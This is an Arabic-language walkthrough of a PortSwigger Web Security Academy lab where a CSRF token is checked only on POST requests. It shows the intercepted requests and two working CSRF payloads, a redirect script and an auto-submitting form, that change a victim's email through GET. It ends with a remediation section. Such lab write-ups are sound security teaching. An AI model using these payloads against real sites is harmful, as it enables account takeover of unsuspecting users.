# [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method)

## **`الهدف`**
إنشاء كود `HTML` يقوم بعمل هجوم `CSRF` بحيث يغير الـ `email` الخاص بالضحية.
## **`خطوات الحل`**
نقوم بتسجيل الدخول إلى حساب `wiener:peter`، ونقوم بعمل تغيير البريد الإلكتروني وإعتراض الـ `request`
```http
POST /my-account/change-email HTTP/2
Host: 0a1900f004c9ea2f8066a81f00a50099.web-security-academy.net
Cookie: session=xAos2OqWHCqLijYUr6x626oo1YHPRadW

email=test.est%40test.com&csrf=WjH6EmjIjrifg9j08MQkCMCB0iMboKvD
```

وببعض التجارب سنكتشف أن اللاب يقبل الـ `request` عند تغيير الـ `Method` إلى `GET`
```http
GET /my-account/change-email?email=test.est%40king.com&csrf=WjH6EmjIjrifg9j08MQkCMCB0iMboKvD HTTP/2
Host: 0a1900f004c9ea2f8066a81f00a50099.web-security-academy.net
Cookie: session=xAos2OqWHCqLijYUr6x626oo1YHPRadW
```

وسنلاحظ وجود الـ `CSRF Token` فى الـ `URL`، وهذا يعنى أنه يتم إرساله تلقائيًا مع `GET`.

وبعد ذلك نقوم بالدخول إلى السيرفر الخاص بنا الذي يوفره اللاب ونقوم بوضع إحدي السكريبتات التالية في خانة `Body`.

==**`ملاحظة:`**== يجب أن يكون الـ `email` غير مُستخدم فلو قمنا في الخطوة السابقة بتغيير الـ `email` الخاص بحساب `wiener` فيجب وضع `email` مختلف في السكريبت الذي نحقنه.

```HTML
<script>
    window.location = "https://0a1900f004c9ea2f8066a81f00a50099.web-security-academy.net/my-account/change-email?email=test.est@king.com";
</script>
```

```html
<form method="GET" action="https://0a1900f004c9ea2f8066a81f00a50099.web-security-academy.net/my-account/change-email"> 
    <input type="hidden" name="email" value="test.est@king.com"> 
</form> 
<script> 
    document.forms[0].submit(); 
</script>
```

بعد ذلك نقوم بالضغط على `Store` ثم `Deliver exploit to victim` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
**`بالإضافة إلى جزء كبير من ترقيع لاب` [CSRF vulnerability with no defenses](./CSRF-vulnerability-with-no-defenses.md)

فيجب أن تقتصر طلبات `GET` على جلب وعرض البيانات فقط، وإجبار أى عملية حساسة على استخدام `POST`، `PUT`، أو `DELETE`، وضبط الـ `Endpoint` ليرد بـ بخطأ `405 Method Not Allowed` إذا استقبل `GET`.
